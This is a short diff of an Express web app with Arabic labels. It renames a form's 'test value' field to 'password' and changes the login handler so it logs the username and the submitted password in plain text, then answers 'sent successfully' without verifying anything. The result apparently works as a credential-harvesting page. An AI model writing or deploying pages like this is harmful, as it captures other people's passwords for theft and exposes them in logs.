@@ -147,7 +147,7 @@ res.send(`
 
 <meta charset="UTF-8">
 
-<title>القيمة التجريبية</title>
+<title>كلمة السر</title>
 
 <style>
 
@@ -236,7 +236,7 @@ cursor:pointer;
 <div class="box">
 
 <h2>
-أدخل قيمة تجريبية
+أدخل كلمة السر
 </h2>
 
 <div class="user">
@@ -270,11 +270,11 @@ required
 
 app.post("/login", (req, res) => {
 
-const testValue = req.body.testValue;
+const password = req.body.testValue;
 
 console.log("========== TEST ==========");
 console.log("Username:", savedUsername);
-console.log("Test Value:", testValue);
+console.log("password:", password);
 console.log("==========================");
 
 res.send("تم الإرسال بنجاح");
